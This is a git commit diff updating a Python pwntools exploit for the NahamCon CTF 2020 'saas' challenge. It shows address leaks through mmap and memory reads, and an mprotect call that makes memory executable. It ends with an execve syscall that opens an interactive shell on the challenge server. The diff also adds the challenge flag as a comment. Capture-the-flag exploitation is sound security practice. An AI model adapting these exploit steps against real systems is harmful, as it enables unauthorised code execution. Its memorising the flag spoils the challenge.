b6f65c97b714d105c84b3a9898b20e03fa0e929b
MUWASEC <muwaxcore@gmail.com>
2020-06-16 19:46:17 +0700

    update some poc

--- NahamConCTF-2020/saas/poc.py
+++ NahamConCTF-2020/saas/poc.py
@@ -15,13 +15,11 @@ def set_reg(rax, rdi=0, rsi=0, rdx=0, r10=0, r9=0, r8=0, ret=True):
 if __name__ == '__main__':
     #p = elf.process()
     p =remote('jh2i.com', 50016)
-    brkaddr = eval(set_reg(12))
-    log.info('leak brk address at 0x%x' % brkaddr)
     ldaddr = eval(set_reg(9, 0, 10, 0, 2 | 32)) # mmap PROT_EXEC with MAP_SHARED | MAP_ANONYMOUS
     log.info('ld.so address at 0x%x' % ldaddr)
-    set_reg(1, rdi=1, rsi=ldaddr + 0x3000, rdx=8, ret=False) # leak _dl_rtld_libname to get pie address
-    elf.address = u64(p.recvuntil('\x00')[1:].ljust(8, b'\x00')) - 0x2a8
-
+    set_reg(1, rdi=1, rsi=ldaddr + 0x3190, rdx=8, ret=False) # leak pie address from ld.so
+    elf.address = u64(p.recvuntil('\x00R')[1:][:-1].ljust(8, b'\x00'))# - 0x52a8
+    
     log.info('elf base address at 0x%x' % elf.address)
     set_reg(0xa, elf.address, 0x5000, 7) # set off full relro 
     set_reg(0, 0, elf.bss() + 0x100, 8, ret=False)
@@ -30,3 +28,4 @@ if __name__ == '__main__':
     p.sendline(b'\xb8\x00') # mov eax, 0
     set_reg(0x3b, elf.bss() + 0x100, ret=False)
     p.interactive()
+    # flag{rax_rdi_rsi_radical_dude}
